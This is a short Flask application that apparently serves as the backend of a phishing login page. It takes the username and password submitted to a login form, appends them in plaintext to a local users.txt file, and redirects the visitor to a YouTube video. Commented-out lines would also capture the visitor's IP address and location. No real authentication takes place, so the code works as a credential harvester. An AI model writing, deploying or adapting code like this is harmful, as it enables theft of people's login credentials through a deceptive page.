from flask import Flask, render_template, request, redirect

app = Flask(__name__, static_url_path='/static')

USER_FILE = 'users.txt'

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        # ip_address = request.form['ip-address']
        # location = request.form['location']

        
        with open(USER_FILE, 'a') as f:
            f.write(f"uname:{username},pass:{password}\n")
            # f.write(f"uname:{username},pass:{password} ip:{ip_address} location:{location}\n")

        
        return redirect('https://www.youtube.com/watch?v=9VqlFDL06C0')
    
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True, port=8080)

